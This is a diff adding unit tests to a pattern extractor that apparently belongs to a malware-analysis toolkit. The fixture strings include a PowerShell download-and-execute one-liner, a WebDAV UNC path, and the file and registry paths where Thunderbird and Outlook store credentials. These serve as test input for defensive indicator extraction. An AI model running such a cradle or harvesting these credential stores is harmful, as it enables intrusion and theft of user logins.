@@ -200,3 +200,22 @@ class TestPatternExtractor(TestUnitBase):
         data = "iex (New-Object System.Net.WebClient).DownloadString('http://www.example.com/boom');".encode('utf-16le')
         url = str(data | self.load('url'))
         self.assertEqual(url, 'http://www.example.com/boom')
+
+    def test_webDAV_paths(self):
+        data = B"\\\\1.1.1.1@556\\the\\finest\\binaires"
+        self.assertEqual(data, data | self.load('path') | bytes)
+
+    def test_registry_paths(self):
+        data = BR'''
+            \Thunderbird\Profiles\
+            %s%s\logins.json
+            %s%s\key4.db
+            SOFTWARE\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676\
+            Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676
+            Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676
+        '''
+        unit = self.load('path')
+        test = data | unit | [str]
+        self.assertIn(
+            R'Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676', test
+        )
